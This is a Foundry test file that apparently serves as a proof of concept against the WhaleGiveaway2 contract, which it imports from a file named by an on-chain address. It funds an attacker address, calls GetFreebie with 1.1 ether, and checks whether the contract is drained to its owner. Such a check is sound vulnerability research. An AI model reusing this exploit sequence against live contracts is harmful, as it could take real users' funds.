// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0xf70d589d76eebdd7c12cc5eec99f8f6fa4233b9e.sol";

contract WhaleGiveaway2Test is Test {
    WhaleGiveaway2 public giveaway;
    address public deployer = makeAddr("deployer");
    address public attacker = makeAddr("attacker");

    function setUp() public {
        // Deploy contract and fund it
        vm.startPrank(deployer);
        giveaway = new WhaleGiveaway2();
        vm.deal(address(giveaway), 10 ether); // Fund contract with test ether
        vm.stopPrank();
        
        // Fund attacker for the exploit
        vm.deal(attacker, 1.1 ether);
    }

    function testGetFreebieDrainsContract() public {
        // Query initial state state
        uint256 initialContractBalance = address(giveaway).balance;
        address ownerAddress = giveaway.Owner();
        uint256 ownerBalanceBefore = ownerAddress.balance;
        
        console.log("--- BEFORE-Trigger state ---");
        console.log("Contract balance (initial):", initialContractBalance);
        console.log("Owner balance (initial):", ownerBalanceBefore);
        console.log("");

        // Trigger vulnerability
        console.log("--- Trigger Vulnerability ---");
        console.log("Attacker calls GetFreebie with 1.1 ether");
        vm.startPrank(attacker);
        giveaway.GetFreebie{value: 1.1 ether}();
        vm.stopPrank();
        console.log("");
        
        console.log("--- AFTER-Trigger state ---");
        uint256 finalContractBalance = address(giveaway).balance;
        uint256 ownerBalanceAfter = ownerAddress.balance;
        uint256 ownerGain;
        if (ownerBalanceAfter > ownerBalanceBefore) {
            ownerGain = ownerBalanceAfter - ownerBalanceBefore;
        } else {
            ownerGain = 0;
        }
        
        console.log("Contract balance (final):", finalContractBalance);
        console.log("Owner balance (final):", ownerBalanceAfter);
        console.log("Owner ETH gain:", ownerGain);
        console.log("");

        // Vulnerability validation
        bool contractDrained = finalContractBalance == 0;
        bool fundsTransferred = ownerGain >= initialContractBalance;

        if (contractDrained && fundsTransferred) {
            console.log("Vulnerability Exists: Contract drained and owner gained ETH");
        } else {
            console.log("Vulnerability not Exist: State change indicators not met");
        }
    }
}